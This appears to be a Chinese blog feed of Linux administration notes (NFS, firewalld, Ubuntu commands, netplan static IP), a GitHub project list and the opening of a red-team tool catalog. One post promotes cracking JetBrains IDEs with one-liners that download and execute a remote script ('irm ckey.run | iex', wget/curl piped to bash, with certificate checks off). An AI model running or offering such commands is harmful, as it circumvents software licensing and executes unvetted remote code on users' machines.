class="line"><span class="meta prompt_"># </span><span class="language-bash">注意：这里的/data/wwwroot 为贡献目录，该目录可以根据自身情况自定义</span></span><br><span class="line">/data/wwwroot # 共享目录</span><br><span class="line">192.168.59.0/24 # 允许该ip段进行连接</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">rw 可读可写权限</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改共享目录权限</span></span><br><span class="line">chmod -R 0777 /data/wwwroot</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重启nfs服务</span></span><br><span class="line">systemctl restart nfs</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">记录exportfs命令</span></span><br><span class="line">exportfs -a # 全部挂载或者全部卸载</span><br><span class="line">exportfs -r # 重新挂载</span><br><span class="line">exportfs -u # 卸载某一个目录</span><br><span class="line">exportfs -v # 显示共享目录</span><br></pre></td></tr></table></figure>
<h3 id="客户端配置-192-168-59-102"><a href="#客户端配置-192-168-59-102" class="headerlink" title="客户端配置(192.168.59.102)"></a>客户端配置(192.168.59.102)</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">检查nfs服务安装情况，一般都是系统安装好的</span></span><br><span class="line">systemctl status rpcbind</span><br><span class="line">systemctl status nfs</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">(若没有启动则重新启动)</span></span><br><span class="line">systemctl start rpcbind</span><br><span class="line">systemctl start nfs</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建挂载目录(可以与服务器端挂载目录不一致）</span></span><br><span class="line">mkdir /data/wwwroot</span><br><span class="line">chmod -R 0777 /data/wwwroot</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">挂载服务器端共享目录</span></span><br><span class="line">mount.nfs 192.168.59.101:/data/wwwroot /data/wwwroot </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">或</span></span><br><span class="line">mount 192.168.59.101:/data/wwwroot /data/wwwroot</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看挂载情况</span></span><br><span class="line">cat /proc/mounts</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">卸载挂载目录（注意：不要在挂载目录里卸载）</span></span><br><span class="line">umount /data/wwwroot</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CentOS</category>
      </categories>
      <tags>
        <tag>CentOS</tag>
      </tags>
  </entry>
  <entry>
    <title>CentOS总结四【常用命令】</title>
    <url>/cnblogs.github.io/p/16807.html</url>
    <content><![CDATA[<h3 id="防火墙命令"><a href="#防火墙命令" class="headerlink" title="防火墙命令"></a>防火墙命令</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">管理防火墙启动、重启、状态、关闭</span></span><br><span class="line">systemctl start|restart|status|stop firewalld</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">开机启动防火墙</span></span><br><span class="line">systemctl enable firewalld</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">禁用防火墙</span></span><br><span class="line">systemctl disable firewalld</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重新加载防火墙规则</span></span><br><span class="line">systemctl reload firewalld</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看当前安装版本</span></span><br><span class="line">firewall-cmd --version</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看防火墙状态</span></span><br><span class="line">firewall-cmd --state</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">列出防火墙所有规则列表</span></span><br><span class="line">firewall-cmd --zone=public --list-all</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">列出允许通过防火墙端口列表</span></span><br><span class="line">firewall-cmd --zone=public --list-ports</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加临时放行端口，重启防火墙后时效</span></span><br><span class="line">firewall-cmd --zone=public --add-port=80/tcp</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加永久放行端口，重启防火墙依旧有效</span></span><br><span class="line">firewall-cmd --zone=public --add-port=80/tcp --permanent</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加永久放行端口段，此例代表8080-8900之间的端口都会放行</span></span><br><span class="line">firewall-cmd --zone=public --add-port=8080-8900/tcp --permanent</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查询端口放行状态，如果存在则返回端口信息，否则不显示</span></span><br><span class="line">firewall-cmd --zone=public --query-port=80/tcp</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">永久删除放行端口</span></span><br><span class="line">firewall-cmd --zone=public --remove-port=80/tcp --permanent</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重新加载防火墙规则</span></span><br><span class="line">firewall-cmd --reload</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CentOS</category>
      </categories>
      <tags>
        <tag>CentOS</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu总结一【基本命令】</title>
    <url>/cnblogs.github.io/p/30267.html</url>
    <content><![CDATA[<h3 id="文件查看与内容处理"><a href="#文件查看与内容处理" class="headerlink" title="文件查看与内容处理"></a>文件查看与内容处理</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat file.txt                 # 显示全部内容</span><br><span class="line">tac file.txt                 # 反向输出</span><br><span class="line">less file.txt                # 分页浏览，q退出</span><br><span class="line">more file.txt                # 类似less</span><br><span class="line">head -n 20 file.txt          # 看前20行</span><br><span class="line">tail -n 20 file.txt          # 看末20行</span><br><span class="line">tail -f log.txt              # 实时查看日志动态（Ctrl+C终止）</span><br><span class="line">grep &quot;关键词&quot; file.txt       # 搜索文件中内容</span><br><span class="line">grep -r &quot;关键词&quot; ./目录      # 递归搜索</span><br><span class="line">wc -l file.txt               # 统计行数</span><br><span class="line">cut -d &#x27;:&#x27; -f 1 etc/passwd   # 分隔符方式提取字段</span><br><span class="line">sort file.txt | uniq         # 排序去重</span><br><span class="line">diff a.txt b.txt             # 对比文件内容差异</span><br></pre></td></tr></table></figure>

<h3 id="权限与所有者管理"><a href="#权限与所有者管理" class="headerlink" title="权限与所有者管理"></a>权限与所有者管理</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls -l file                  # 查看权限</span><br><span class="line">chmod 755 file              # 修改权限为rwxr-xr-x</span><br><span class="line">chmod u+x script.sh         # 增加可执行权限</span><br><span class="line">chown user file             # 修改属主</span><br><span class="line">chown user:group file       # 修改属主和属组</span><br><span class="line">sudo command                # 以root权限执行命令</span><br></pre></td></tr></table></figure>

<h3 id="系统管理和监控"><a href="#系统管理和监控" class="headerlink" title="系统管理和监控"></a>系统管理和监控</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">free -m                        # 查看内存占用 (单位MB)</span><br><span class="line">df -h                          # 查看分区使用 (人类可读)</span><br><span class="line">du -sh /文件夹                 # 查看文件夹大小</span><br><span class="line">top/htop                       # 查看进程和资源占用</span><br><span class="line">ps aux                         # 查看全部进程</span><br><span class="line">ps aux | grep nginx            # 查找进程</span><br><span class="line">kill PID                       # 终止指定进程</span><br><span class="line">kill -9 PID                    # 强制终止进程</span><br><span class="line">history                        # 查看命令历史</span><br><span class="line">uptime                         # 查看开机时长和负载</span><br><span class="line">who                            # 当前在线用户</span><br><span class="line">uname -a                       # 系统/内核信息</span><br><span class="line">lscpu                          # 查看CPU信息</span><br><span class="line">lsblk                          # 存储设备和挂载信息</span><br></pre></td></tr></table></figure>

<h3 id="网络管理和测试"><a href="#网络管理和测试" class="headerlink" title="网络管理和测试"></a>网络管理和测试</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ip a / ifconfig                      # 查看和配置网络</span><br><span class="line">ping baidu.com                       # 测试网络连通性</span><br><span class="line">traceroute www.baidu.com             # 跟踪路由</span><br><span class="line">netstat -tulnp                       # 监听端口(旧系统)</span><br><span class="line">ss -tulnp                            # 新系统端口</span><br><span class="line">curl -I https://www.baidu.com        # 获取网页响应头</span><br><span class="line">wget http://...                      # 下载文件</span><br><span class="line">scp 本地文件 user@host:/目标路径     # 远程复制</span><br><span class="line">rsync -avz 源 目标                   # 高效同步</span><br><span class="line">ssh user@host                        # 远程登录</span><br></pre></td></tr></table></figure>

<h3 id="软件包管理-APT"><a href="#软件包管理-APT" class="headerlink" title="软件包管理 APT"></a>软件包管理 APT</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt update                         # 更新软件源</span><br><span class="line">sudo apt upgrade                        # 升级已安装包</span><br><span class="line">sudo apt install 软件包                  # 安装软件</span><br><span class="line">sudo apt remove 软件包                   # 卸载软件</span><br><span class="line">sudo apt purge 软件包                    # 卸载并清理配置</span><br><span class="line">sudo apt autoremove                     # 清理不再使用的依赖</span><br><span class="line">sudo apt search 关键词                   # 搜索软件包</span><br><span class="line">sudo apt list --installed               # 已安装包</span><br><span class="line">sudo dpkg -i 包名.deb                   # 手动安装deb包</span><br><span class="line">sudo apt --fix-broken install           # 解决依赖问题</span><br></pre></td></tr></table></figure>

<h3 id="压缩与解压"><a href="#压缩与解压" class="headerlink" title="压缩与解压"></a>压缩与解压</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tar -czf archive.tar.gz dir     # 压缩目录</span><br><span class="line">tar -xzf archive.tar.gz         # 解压</span><br><span class="line">zip -r file.zip dir             # 打包为 zip</span><br><span class="line">unzip file.zip                  # 解压 zip</span><br><span class="line">gzip file.txt                   # 压缩文件</span><br><span class="line">gunzip file.txt.gz              # 解压文件</span><br><span class="line">xz -z file                      # xz 压缩</span><br><span class="line">xz -d file.xz                   # xz 解压</span><br><span class="line">7z a file.7z dir                # 高压缩（需安装）</span><br><span class="line">7z x file.7z                    # 解压（需安装）</span><br></pre></td></tr></table></figure>

<h3 id="排查问题命令"><a href="#排查问题命令" class="headerlink" title="排查问题命令"></a>排查问题命令</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo netstat -tlnp | grep 30001  # 排查端口占用情况</span><br><span class="line">du-ah / |sort-rh |head-n 10      # du查找大文件</span><br><span class="line">journalctl -xe                   # 查看系统日志（systemd）</span><br><span class="line">dmesg                            # 查看启动和内核日志</span><br><span class="line">tail -f /var/log/syslog          # 实时查看系统日志</span><br><span class="line">tail -f /var/log/auth.log        # 查看安全认证日志</span><br></pre></td></tr></table></figure>

<h3 id="工具安装"><a href="#工具安装" class="headerlink" title="工具安装"></a>工具安装</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 编辑工具</span></span></span><br><span class="line">sudo apt install vim</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 网络工具</span></span></span><br><span class="line">sudo apt install iputils-ping</span><br><span class="line">sudo apt install telnet telnetd openbsd-inetd</span><br><span class="line">sudo apt-get install dnsutils</span><br><span class="line">sudo apt-get install net-tools</span><br><span class="line">sudo apt-get install lrzsz</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 常用工具</span></span></span><br><span class="line">sudo apt-get install zip</span><br></pre></td></tr></table></figure>

<h3 id="防火墙命令"><a href="#防火墙命令" class="headerlink" title="防火墙命令"></a>防火墙命令</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装ufw</span></span><br><span class="line">sudo apt install ufw -y</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 开启防火墙</span></span></span><br><span class="line">sudo ufw enable</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 关闭防火墙</span></span></span><br><span class="line">sudo ufw disable </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 开启设置的默认策略</span></span></span><br><span class="line">sudo ufw default allow</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 查看防火墙状态</span></span></span><br><span class="line">sudo ufw status</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 开启端口</span></span></span><br><span class="line">sudo ufw allow 22</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 删除规则</span></span></span><br><span class="line">sudo ufw delete allow 22</span><br></pre></td></tr></table></figure>

<h3 id="清理命令"><a href="#清理命令" class="headerlink" title="清理命令"></a>清理命令</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 列出已安装的内核</span></span></span><br><span class="line">dpkg --list | grep linux-image</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 删除一个特定的内核版本</span></span></span><br><span class="line">sudo apt-get remove --purge linux-image-&lt;version&gt;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 清理其他缓存文件</span></span></span><br><span class="line">rm-rf ~/.cache/*</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 清理未使用的包文件</span></span></span><br><span class="line">sudo apt-get clean</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 清理已安装包的无用依赖项</span></span></span><br><span class="line">sudo apt-get autoremove</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 删除过期的包</span></span></span><br><span class="line">sudo apt-get autoclean</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 清理日志文件 （删除超过 7 天的日志文件）</span></span></span><br><span class="line">sudo journalctl --vacuum-time=7d</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Ubuntu</category>
      </categories>
      <tags>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu服务器配置一【配置固定IP】</title>
    <url>/cnblogs.github.io/p/3b38.html</url>
    <content><![CDATA[<p>在 Ubuntu 服务器上配置固定 IP（静态 IP）可以通过 netplan（Ubuntu 17.10 及更高版本默认使用）或直接修改 &#x2F;etc&#x2F;network&#x2F;interfaces（旧版 Ubuntu）。以下是两种方法的详细步骤：</p>
<h2 id="方法-1：使用-Netplan（推荐，适用于-Ubuntu-17-10-）"><a href="#方法-1：使用-Netplan（推荐，适用于-Ubuntu-17-10-）" class="headerlink" title="方法 1：使用 Netplan（推荐，适用于 Ubuntu 17.10+）"></a>方法 1：使用 Netplan（推荐，适用于 Ubuntu 17.10+）</h2><p>Netplan 是 Ubuntu 的现代网络配置工具，使用 YAML 文件定义网络接口。</p>
<h3 id="1-查看当前网络接口"><a href="#1-查看当前网络接口" class="headerlink" title="1. 查看当前网络接口"></a>1. 查看当前网络接口</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ip addr</span><br></pre></td></tr></table></figure>
<p>找到要配置的网卡名称（如 ens33、eth0 或 enp0s3）。</p>
<h3 id="2-编辑-Netplan-配置文件"><a href="#2-编辑-Netplan-配置文件" class="headerlink" title="2. 编辑 Netplan 配置文件"></a>2. 编辑 Netplan 配置文件</h3><p>Ubuntu 的 Netplan 配置文件通常位于 &#x2F;etc&#x2F;netplan&#x2F; 目录下，文件名可能是：</p>
<ul>
<li>01-netcfg.yaml</li>
<li>50-cloud-init.yaml</li>
<li>00-installer-config.yaml</li>
</ul>
<p>使用 nano 或 vim 编辑：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo nano /etc/netplan/01-netcfg.yaml</span><br></pre></td></tr></table></figure>
<h3 id="3-配置静态-IP"><a href="#3-配置静态-IP" class="headerlink" title="3. 配置静态 IP"></a>3. 配置静态 IP</h3><p>修改文件内容如下（示例，请根据你的网络调整）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">network:</span><br><span class="line">  version: 2</span><br><span class="line">  renderer: networkd</span><br><span class="line">  ethernets:</span><br><span class="line">    ens33:  # 你的网卡名称</span><br><span class="line">      dhcp4: no  # 禁用 DHCP</span><br><span class="line">      addresses: [192.168.0.100/24]  # 静态 IP 和子网掩码</span><br><span class="line">      gateway4: 192.168.0.1  # 默认网关</span><br><span class="line">      nameservers:</span><br><span class="line">        addresses: [8.8.8.8, 8.8.4.4]  # DNS 服务器</span><br></pre></td></tr></table></figure>
<h3 id="4-应用配置"><a href="#4-应用配置" class="headerlink" title="4. 应用配置"></a>4. 应用配置</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo netplan apply</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如果报错，可以调试：</span></span><br><span class="line">sudo netplan --debug apply</span><br></pre></td></tr></table></figure>
<h3 id="5-验证"><a href="#5-验证" class="headerlink" title="5. 验证"></a>5. 验证</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ip addr</span><br><span class="line">ping google.com</span><br></pre></td></tr></table></figure>

<h2 id="方法-2：修改-etc-network-interfaces（旧版-Ubuntu）"><a href="#方法-2：修改-etc-network-interfaces（旧版-Ubuntu）" class="headerlink" title="方法 2：修改 &#x2F;etc&#x2F;network&#x2F;interfaces（旧版 Ubuntu）"></a>方法 2：修改 &#x2F;etc&#x2F;network&#x2F;interfaces（旧版 Ubuntu）</h2><p>如果 Ubuntu 使用传统的 ifupdown 网络管理工具（如 Ubuntu 16.04 或更早），可以手动修改网络接口文件。</p>
<h3 id="1-编辑网络接口配置"><a href="#1-编辑网络接口配置" class="headerlink" title="1. 编辑网络接口配置"></a>1. 编辑网络接口配置</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo nano /etc/network/interfaces</span><br></pre></td></tr></table></figure>
<h3 id="2-配置静态-IP"><a href="#2-配置静态-IP" class="headerlink" title="2. 配置静态 IP"></a>2. 配置静态 IP</h3><p>找到你的网卡（如 eth0 或 ens33），修改为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auto ens33</span><br><span class="line">iface ens33 inet static</span><br><span class="line">    address 192.168.0.100</span><br><span class="line">    netmask 255.255.255.0</span><br><span class="line">    gateway 192.168.0.1</span><br><span class="line">    dns-nameservers 8.8.8.8 8.8.4.4</span><br></pre></td></tr></table></figure>
<h3 id="3-重启网络服务"><a href="#3-重启网络服务" class="headerlink" title="3. 重启网络服务"></a>3. 重启网络服务</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo systemctl restart networking</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">或</span></span><br><span class="line">sudo ifdown ens33 &amp;&amp; sudo ifup ens33</span><br></pre></td></tr></table></figure>
<h3 id="4-验证"><a href="#4-验证" class="headerlink" title="4. 验证"></a>4. 验证</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ifconfig</span><br><span class="line">ping google.com</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><table>
<thead>
<tr>
<th>方法</th>
<th>适用版本</th>
<th>配置文件</th>
<th>命令</th>
</tr>
</thead>
<tbody><tr>
<td>Netplan</td>
<td>Ubuntu 18.04+</td>
<td>&#x2F;etc&#x2F;netplan&#x2F;*.yaml</td>
<td>sudo netplan apply</td>
</tr>
<tr>
<td>&#x2F;etc&#x2F;network&#x2F;interfaces</td>
<td>Ubuntu 16.04 或更早</td>
<td>&#x2F;etc&#x2F;network&#x2F;interfaces</td>
<td>sudo systemctl restart networking</td>
</tr>
<tr>
<td>推荐使用 Netplan（Ubuntu 18.04+），因为它更现代且易于管理。如果遇到问题，检查日志：</td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">journalctl -xe</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Ubuntu</category>
      </categories>
      <tags>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title>软件使用总结一【激活JetBrains全家桶】</title>
    <url>/cnblogs.github.io/p/a209.html</url>
    <content><![CDATA[<p>在 Windows、Linux、macOS 上使用 JetBrains 系列 IDE（如 IDEA、CLion、PyCharm 等）时，往往需要繁琐的激活操作或下载破解补丁。但最近发现了一种全新方式——无需手动下载文件，一键激活最完整的 JetBrains 全家桶，覆盖三大操作系统。这波“懒人福利”，必须安利给你！</p>
<p><strong>Windows PowerShell：</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">irm ckey.run | iex</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Debug</span></span><br><span class="line">irm ckey.run/debug | iex</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">仅查看源码（不执行）</span></span><br><span class="line">irm ckey.run</span><br></pre></td></tr></table></figure>

<p><strong>Linux&#x2F;WSL&#x2F;Ubuntu：</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget --no-check-certificate ckey.run -O ckey.run &amp;&amp; bash ckey.run</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Debug 模式</span></span><br><span class="line">wget --no-check-certificate ckey.run/debug -O ckey.run &amp;&amp; bash ckey.run</span><br></pre></td></tr></table></figure>

<p><strong>macOS（Intel&#x2F;M系列）：</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -L -o ckey.run ckey.run &amp;&amp; bash ckey.run</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Debug 模式</span></span><br><span class="line">curl -L -o ckey.run ckey.run/debug &amp;&amp; bash ckey.run</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>激活原理:</strong> 本工具通过自动检测本机 JetBrains 产品，下载并配置 ja-netfilter 激活代理，注入启动参数（包括 -javaagent 和必要的 –add-opens 权限），并调用远程接口生成激活密钥，实现无需手动配置的全自动激活。</p>
</blockquote>
]]></content>
      <categories>
        <category>Software</category>
      </categories>
      <tags>
        <tag>Software</tag>
      </tags>
  </entry>
  <entry>
    <title>GitHub项目与工具收集</title>
    <url>/cnblogs.github.io/p/f98d.html</url>
    <content><![CDATA[<h3 id="Java-项目"><a href="#Java-项目" class="headerlink" title="Java 项目"></a>Java 项目</h3><table>
<thead>
<tr>
<th>项目名称</th>
<th>项目地址</th>
<th>项目描述</th>
</tr>
</thead>
<tbody><tr>
<td>分布式电商项目</td>
<td><a href="https://github.com/SiGuiyang/spring-cloud-shop">https://github.com/SiGuiyang/spring-cloud-shop</a></td>
<td>基于 Spring Cloud 的分布式电商项目，该项目使用分库设计方案，不同的模块依赖不同的数据库实例</td>
</tr>
<tr>
<td>微服务商城系统</td>
<td><a href="https://github.com/gz-yami/mall4cloud">https://github.com/gz-yami/mall4cloud</a></td>
<td>mall4cloud是一个高质量的微服务 B2B2C 电商商城系统</td>
</tr>
<tr>
<td>网约车项目</td>
<td><a href="https://github.com/OiPunk/OnlineTaxi">https://github.com/OiPunk/OnlineTaxi</a></td>
<td>网约车项目</td>
</tr>
<tr>
<td>RuoYi若依</td>
<td><a href="https://github.com/yangzongzhuan/RuoYi">https://github.com/yangzongzhuan/RuoYi</a></td>
<td>基于 SpringBoot 搭建，代码易读易懂、界面简洁美观</td>
</tr>
<tr>
<td>Bolo菠萝博客</td>
<td><a href="https://github.com/bolo-blog/bolo-solo">https://github.com/bolo-blog/bolo-solo</a></td>
<td>专为程序员设计的精致Java博客系统</td>
</tr>
<tr>
<td>开源博客系统</td>
<td><a href="https://github.com/Naccl/NBlog">https://github.com/Naccl/NBlog</a></td>
<td>Spring Boot + Vue「前后端分离，人不分离」博客系统</td>
</tr>
<tr>
<td>博客系统</td>
<td><a href="https://gitee.com/yeeevip/yeee-blog">https://gitee.com/yeeevip/yeee-blog</a></td>
<td>基于springboot+vue快速搭建一个轻量级实用的博客系统</td>
</tr>
<tr>
<td>人力资源管理系统</td>
<td><a href="https://github.com/lenve/vhr">https://github.com/lenve/vhr</a></td>
<td>基于 SpringBoot 和 Vue 开发的前后端分离的人力资源管理系统</td>
</tr>
<tr>
<td>轻松阅读微服务项目</td>
<td>client：<a href="https://github.com/Zealon159/light-reading-cloud-client">https://github.com/Zealon159/light-reading-cloud-client</a><br>api：<a href="https://github.com/Zealon159/light-reading-cloud">https://github.com/Zealon159/light-reading-cloud</a></td>
<td>轻松阅读是一款图书阅读类 APP，基于 Spring Cloud 开发的微服务实战项目</td>
</tr>
</tbody></table>
<h3 id="Python-项目"><a href="#Python-项目" class="headerlink" title="Python 项目"></a>Python 项目</h3><table>
<thead>
<tr>
<th>项目名称</th>
<th>项目地址</th>
<th>项目描述</th>
</tr>
</thead>
<tbody><tr>
<td>EasySpider</td>
<td><a href="https://github.com/NaiboWang/EasySpider">https://github.com/NaiboWang/EasySpider</a></td>
<td>一个可视化浏览器自动化测试&#x2F;数据采集&#x2F;爬虫软件，可以无代码图形化的设计和执行爬虫任务</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Website</category>
      </categories>
      <tags>
        <tag>Website</tag>
      </tags>
  </entry>
  <entry>
    <title>各类红蓝队优秀工具项目集合</title>
    <url>/cnblogs.github.io/p/3fb4.html</url>
    <content><![CDATA[<h1 id="All-Defense-Tool"><a href="#All-Defense-Tool" class="headerlink" title="All-Defense-Tool"></a>All-Defense-Tool</h1><p>​	 首先恭喜你发现了宝藏。本项目集成了全网优秀的开源攻防武器项目，包含信息收集工具（自动化利用工具、资产发现工具、目录扫描工具、子域名收集工具、指纹识别工具、端口扫描工具、各种插件….etc…），漏洞利用工具（各大CMS、OA利用工具、中间件利用工具、反序列化利用工具、数据库利用工具等项目……..），内网渗透工具（隧道代理、密码提取、木马免杀、域渗透…..）、应急响应工具、甲方运维工具、等其他安全攻防资料整理，供攻防双方使用。</p>
<p>​	<strong>工欲善其事必先利其器，不知道有哪些工具，不会用工具，不懂工具原理，怎么写出适合自己的工具？</strong></p>
<h2 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h2><p><strong>重点提醒：本项目工具来源于互联网，是否含带木马及后门请自行甄别！！Hvv来即，请大家提高警惕！！！</strong></p>
<ol>
<li><code>本项目所有内容,仅供学习和研究使用,请勿使用项目的技术手段用于非法用途,任何人造成的任何负面影响,与本人无关.</code></li>
<li><code>本文档所有内容、新闻皆不代表本人态度、立场,如果有建议或方案,欢迎提交 issues，不受理Pull request</code></li>
<li><code>不会收取任何广告费用,展示的所有工具链接与本人无任何利害关系</code></li>
</ol>
<p>温馨提醒：不要沉迷于攻防而忘了吃饭喔~</p>
<ul>
<li>程序员在家做饭方法指南。<a href="https://github.com/Anduin2017/HowToCook">https://github.com/Anduin2017/HowToCook</a></li>
</ul>
<h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><ul>
<li><a href="#%E5%8D%8A%E5%85%A8%E8%87%AA%E5%8A%A8%E5%8C%96%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7">半&#x2F;全自动化利用工具</a></li>
<li><a href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7">信息收集工具</a><ul>
<li><a href="#%E8%B5%84%E4%BA%A7%E5%8F%91%E7%8E%B0%E5%B7%A5%E5%85%B7">资产发现工具</a></li>
<li><a href="#%E5%AD%90%E5%9F%9F%E5%90%8D%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7">子域名收集工具</a></li>
<li><a href="#%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7">目录扫描工具</a></li>
<li><a href="#%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E5%B7%A5%E5%85%B7">指纹识别工具</a></li>
<li><a href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7">端口扫描工具</a></li>
<li><a href="#burp%E6%8F%92%E4%BB%B6">Burp插件</a></li>
<li><a href="#%E6%B5%8F%E8%A7%88%E5%99%A8%E6%8F%92%E4%BB%B6">浏览器插件</a></li>
<li><a href="#%E9%82%AE%E7%AE%B1%E9%92%93%E9%B1%BC">邮箱&amp;钓鱼</a></li>
<li><a href="#%E7%A4%BE%E5%B7%A5%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%B1%BB">社工个人信息收集类</a></li>
<li><a href="#app%E5%85%AC%E4%BC%97%E5%8F%B7%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9B%B8%E5%85%B3%E5%B7%A5%E5%85%B7">APP&#x2F;公众号&#x2F;小程序相关工具</a></li>
<li><a href="#%E5%B8%B8%E7%94%A8%E5%B0%8F%E5%B7%A5%E5%85%B7">常用小工具</a></li>
</ul>
</li>
<li><a href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7">漏洞利用工具</a><ul>
<li><a href="#%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E6%A1%86%E6%9E%B6%E5%B7%A5%E5%85%B7">漏洞扫描框架&#x2F;工具</a></li>
